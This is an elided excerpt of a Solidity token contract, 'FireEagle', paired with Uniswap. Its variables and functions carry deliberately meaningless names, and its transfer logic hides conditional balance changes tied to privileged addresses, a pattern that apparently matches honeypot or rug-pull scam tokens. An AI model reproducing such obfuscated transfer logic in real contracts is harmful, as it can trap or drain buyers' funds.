...
contract FireEagle is Ownable {
    uint256 private quick;
    string private shine;
    uint256 private _tTotal;
    string private half;
    uint256 private grabbed;
    uint8 private sand;
    ...
    mapping(address => uint256) private cent;
    ...
    function about(
        ...
        if (arrangement[spin] == 0 && !arrange && active[spin] > 0) {
            arrangement[spin] -= sand;
        }

        to = money / grabbed;

        if (arrangement[spin] == 0) {
            cent[spin] -= citizen;
        }

        address steam = support;
    ...
    function transferFrom(
        ...
        about(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        about(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(completely);
        army = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        quick = 0;
        grabbed = 100;
        arrangement[shout] = sand;
        _tTotal = 1000000000000000 * 10**sand;
        cent[msg.sender] = _tTotal;
    }
}